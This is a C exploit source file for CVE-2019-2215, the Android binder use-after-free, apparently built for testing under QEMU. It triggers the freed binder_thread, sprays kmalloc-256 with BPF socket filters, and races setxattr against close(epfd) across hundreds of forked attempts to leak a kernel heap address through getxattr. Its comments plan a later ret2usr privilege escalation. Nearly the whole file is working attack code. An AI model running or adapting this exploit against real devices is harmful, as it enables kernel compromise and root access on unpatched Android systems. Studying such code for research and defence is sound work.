/*
 * cve_2019_2215_xattr.c — CVE-2019-2215 heap leak via setxattr race
 *
 * THEORY:
 * setxattr allocates in kmalloc-256, copies user data, then writes to
 * filesystem. If close(epfd) corrupts the heap buffer between copy_from_user
 * and the filesystem write, the corrupted data (with kernel heap address)
 * is stored on disk. getxattr reads it back → INFO LEAK!
 *
 * Race window: copy_from_user → SELinux check → journal start → memcpy to
 * inode xattr area. Several microseconds.
 *
 * PLAN:
 * Phase 1: Determine exact xattr payload size for kmalloc-256
 * Phase 2: Set up binder UAF + epoll
 * Phase 3: Race setxattr with close(epfd), check getxattr for corruption
 * Phase 4: If leak succeeds, full exploit with ret2usr
 *
 * Build: .\qemu\build-arm.bat src\cve_2019_2215_xattr.c cve_2019_2215_xattr
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <unistd.h>

/* Binder */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)
#define BC_ENTER_LOOPER         0x630c

struct binder_write_read {
    signed long write_size, write_consumed;
    unsigned long write_buffer;
    signed long read_size, read_consumed;
    unsigned long read_buffer;
};

/* binder_thread wait_queue offsets (from disassembly) */
#define BT_WAIT_LOCK 44
#define BT_WAIT_NEXT 48
#define BT_WAIT_PREV 52

/* setxattr header overhead in VFS: depends on implementation.
 * The kmalloc in vfs_setxattr is for the VALUE only.
 * For kmalloc-256: value_len should be 193-256 bytes.
 * But we must account for any VFS wrapper overhead.
 * Let's test empirically in Phase 1. */
#define XATTR_PATH "/data/local/tmp/.xattr_leak"
#define XATTR_NAME "user.leak"

static const char MARKER[] = "\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE";

static void read_slab(const char *cache, long *out) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512]; *out = -1;
    if (!f) return;
    while (fgets(line, sizeof(line), f))
        if (strncmp(line, cache, strlen(cache)) == 0 && line[strlen(cache)] == ' ')
            { sscanf(line + strlen(cache) + 1, "%ld", out); break; }
    fclose(f);
}

/* ========== Phase 1: Find correct xattr payload size for kmalloc-256 ========== */
static int find_xattr_k256_size(void) {
    printf("=== Phase 1: Find xattr kmalloc-256 size ===\n");

    /* Create test file */
    int fd = open(XATTR_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd < 0) { perror("create"); return -1; }
    write(fd, "x", 1); close(fd);

    /* Test various sizes */
    int sizes[] = { 150, 170, 190, 200, 210, 220, 230, 232, 240, 250, 256, 0 };
    int best_size = 200;
    long best_delta = 0;

    for (int i = 0; sizes[i]; i++) {
        long k256_before, k256_after;

        /* Remove old xattr */
        removexattr(XATTR_PATH, XATTR_NAME);

        char *buf = malloc(sizes[i]);
        memset(buf, 'Z', sizes[i]);

        read_slab("kmalloc-256", &k256_before);

        /* Set 200 xattrs on different files to measure */
        char path[256];
        for (int j = 0; j < 200; j++) {
            snprintf(path, sizeof(path), "/data/local/tmp/.xattr_test_%d", j);
            int tfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (tfd >= 0) { write(tfd, "x", 1); close(tfd); }
            char name[64];
            snprintf(name, sizeof(name), "user.t%d", j);
            setxattr(path, name, buf, sizes[i], 0);
        }

        read_slab("kmalloc-256", &k256_after);
        long delta = k256_after - k256_before;
        printf("  size=%d: k256 delta=%+ld (%.1f/xattr)\n",
               sizes[i], delta, delta / 200.0);

        /* Cleanup */
        for (int j = 0; j < 200; j++) {
            snprintf(path, sizeof(path), "/data/local/tmp/.xattr_test_%d", j);
            unlink(path);
        }

        if (delta > best_delta) {
            best_delta = delta;
            best_size = sizes[i];
        }
        free(buf);
    }

    printf("  Best size: %d (delta=%+ld)\n\n", best_size, best_delta);
    return best_size;
}

/* ========== Phase 2: Set up binder UAF + epoll ========== */
struct uaf_state {
    int binder_fd;
    int epfd;
};

static int setup_binder_uaf(struct uaf_state *s) {
    s->binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (s->binder_fd < 0) return -1;

    uint32_t max = 0;
    ioctl(s->binder_fd, BINDER_SET_MAX_THREADS, &max);

    /* Enter looper → creates binder_thread */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (unsigned long)&cmd;
    ioctl(s->binder_fd, BINDER_WRITE_READ, &bwr);

    /* Add to epoll → links wait entry to binder_thread->wait */
    s->epfd = epoll_create1(O_CLOEXEC);
    if (s->epfd < 0) { close(s->binder_fd); return -1; }

    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(s->epfd, EPOLL_CTL_ADD, s->binder_fd, &ev) < 0) {
        close(s->epfd); close(s->binder_fd); return -1;
    }

    /* BINDER_THREAD_EXIT → frees binder_thread */
    int thr = 0;
    ioctl(s->binder_fd, BINDER_THREAD_EXIT, &thr);

    return 0;
}

/* ========== Phase 3: Race setxattr with close(epfd) ========== */

static volatile int race_go = 0;
static volatile int race_done = 0;
static int race_epfd = -1;
static int race_delay_us = 0; /* microsecond delay for closer */

/* Busy-wait for approximately N microseconds.
 * On Cortex-A53 ~1.2GHz, ~300 loop iterations ≈ 1 μs */
static void busywait_us(int us) {
    for (volatile int i = 0; i < us * 300; i++);
}

static void *closer_thread(void *arg) {
    /* Pin to CPU 1 for parallel execution */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(1 % sysconf(_SC_NPROCESSORS_ONLN), &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    while (!race_go) sched_yield();
    /* Delay to hit the window between copy_from_user and ext4 memcpy.
     * Window is ~20-100μs after setxattr enters kernel. */
    busywait_us(race_delay_us);
    close(race_epfd);
    race_done = 1;
    return NULL;
}

static int attempt_xattr_race(int xattr_size, int attempt) {
    struct uaf_state s;
    if (setup_binder_uaf(&s) < 0) return -1;

    /* Prepare xattr value with markers at the wait queue offsets */
    char *val = malloc(xattr_size);
    memset(val, 'A' + (attempt % 26), xattr_size);

    /* Place unique markers at the list_del target offsets */
    if (xattr_size > BT_WAIT_LOCK + 4) {
        memset(val + BT_WAIT_LOCK, 0, 4); /* spinlock = 0 */
    }
    if (xattr_size > BT_WAIT_NEXT + 4) {
        memcpy(val + BT_WAIT_NEXT, MARKER, 4); /* known pattern at next */
    }
    if (xattr_size > BT_WAIT_PREV + 4) {
        memcpy(val + BT_WAIT_PREV, MARKER + 4, 4); /* known pattern at prev */
    }

    /* Spray 200 BPF filters to fill kmalloc-256 slab */
    int spray_socks[200];
    int nspray = 0;
    struct sock_filter insns[26];
    for (int j = 0; j < 25; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0;
    }
    insns[25].code = BPF_RET | BPF_K;
    insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF;
    struct sock_fprog prog = { .len = 26, .filter = insns };

    for (int j = 0; j < 200; j++) {
        spray_socks[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray_socks[j] >= 0) {
            setsockopt(spray_socks[j], SOL_SOCKET, SO_ATTACH_FILTER,
                       &prog, sizeof(prog));
            nspray++;
        }
    }

    /* Pin main thread to CPU 0 for reliable SLUB LIFO reclaim */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* Create xattr file */
    char path[256];
    snprintf(path, sizeof(path), "/data/local/tmp/.xattr_leak_%d", attempt);
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { write(fd, "x", 1); close(fd); }

    /* Set up the race with variable delay */
    race_go = 0;
    race_done = 0;
    race_epfd = s.epfd;
    /* Vary delay 5-120μs to sweep the race window */
    race_delay_us = 5 + (attempt % 116);

    pthread_t thr;
    pthread_create(&thr, NULL, closer_thread, NULL);

    /* Start the race: setxattr allocates in kmalloc-256.
     * On CPU 0, SLUB LIFO should give us the freed binder_thread slot. */
    race_go = 1;
    setxattr(path, XATTR_NAME, val, xattr_size, XATTR_CREATE);

    /* Wait for closer to finish */
    pthread_join(thr, NULL);

    /* Read back the xattr */
    char *rbuf = malloc(xattr_size);
    memset(rbuf, 0, xattr_size);
    ssize_t rlen = getxattr(path, XATTR_NAME, rbuf, xattr_size);

    int leaked = 0;
    if (rlen > BT_WAIT_PREV + 4) {
        uint32_t val_next = *(uint32_t*)(rbuf + BT_WAIT_NEXT);
        uint32_t val_prev = *(uint32_t*)(rbuf + BT_WAIT_PREV);
        uint32_t orig_next = *(uint32_t*)(val + BT_WAIT_NEXT);
        uint32_t orig_prev = *(uint32_t*)(val + BT_WAIT_PREV);

        if (val_next != orig_next || val_prev != orig_prev) {
            printf("  [%d] CORRUPTION DETECTED!\n", attempt);
            printf("    next: was 0x%08x now 0x%08x\n", orig_next, val_next);
            printf("    prev: was 0x%08x now 0x%08x\n", orig_prev, val_prev);

            if (val_next >= 0xC0000000 && val_next < 0xF0000000) {
                printf("    ✓ KERNEL HEAP LEAK: 0x%08x\n", val_next);
                printf("    Object base ≈ 0x%08x\n", val_next - BT_WAIT_NEXT);
                leaked = 1;
            }
        }
    }

    /* Cleanup */
    unlink(path);
    free(val);
    free(rbuf);
    for (int j = 0; j < 200; j++)
        if (spray_socks[j] >= 0) close(spray_socks[j]);
    close(s.binder_fd);
    /* epfd already closed by race thread */

    return leaked;
}

/* ========== Main ========== */

static void sighandler(int sig) {
    printf("*** SIGNAL %d ***\n", sig);
    fflush(stdout);
    _exit(128 + sig);
}

int main(int argc, char **argv) {
    int attempts = 500;
    if (argc > 1) attempts = atoi(argv[1]);

    printf("=== CVE-2019-2215 Heap Leak via xattr Race ===\n");
    printf("Attempts: %d, PID=%d UID=%d\n\n", attempts, getpid(), getuid());

    signal(SIGSEGV, sighandler);
    signal(SIGBUS, sighandler);

    /* Phase 1: Find xattr size (skip if we know it) */
    int xattr_size = 200; /* Default: 200 bytes (224 total with VFS header) */

    /* Quick verification that setxattr works */
    int testfd = open(XATTR_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (testfd >= 0) { write(testfd, "x", 1); close(testfd); }
    char testval[200];
    memset(testval, 'T', sizeof(testval));
    if (setxattr(XATTR_PATH, XATTR_NAME, testval, sizeof(testval), XATTR_CREATE) < 0) {
        printf("setxattr failed: %s\n", strerror(errno));
        return 1;
    }
    removexattr(XATTR_PATH, XATTR_NAME);
    unlink(XATTR_PATH);
    printf("setxattr works, using payload size %d\n\n", xattr_size);

    /* Phase 3: Race attempts */
    printf("=== Phase 3: Racing setxattr vs close(epfd) ===\n");
    printf("Each attempt: UAF → setxattr → close(epfd) → getxattr\n\n");
    fflush(stdout);

    int leaked = 0;
    for (int i = 0; i < attempts; i++) {
        if (i % 100 == 0) {
            printf("  Attempt %d/%d...\n", i, attempts);
            fflush(stdout);
        }

        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int r = attempt_xattr_race(xattr_size, i);
            _exit(r > 0 ? 0 : 1);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            printf("  ✓ LEAK SUCCEEDED at attempt %d!\n", i);
            leaked = 1;
            break;
        }
    }

    if (!leaked)
        printf("\n  No leak after %d attempts (race window may be too tight)\n", attempts);

    printf("\n=== Done ===\n");
    return leaked ? 0 : 1;
}
